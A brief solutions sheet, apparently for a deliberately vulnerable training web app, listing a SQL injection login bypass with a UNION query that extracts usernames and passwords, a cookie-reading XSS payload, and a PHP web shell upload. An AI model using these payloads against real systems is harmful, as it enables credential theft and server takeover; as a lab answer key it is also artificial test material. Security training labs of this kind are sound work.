# Solutions (INSTRUCTIONS)

- SQLi: use `' OR '1'='1' -- ` to bypass search AND `UNION SELECT username, password FROM users` to extract rows.
- XSS: post `<script>alert(document.cookie)</script>` to `/xss`.
- Upload: upload `shell.php` then access `/uploads/shell.php` (local lab only).

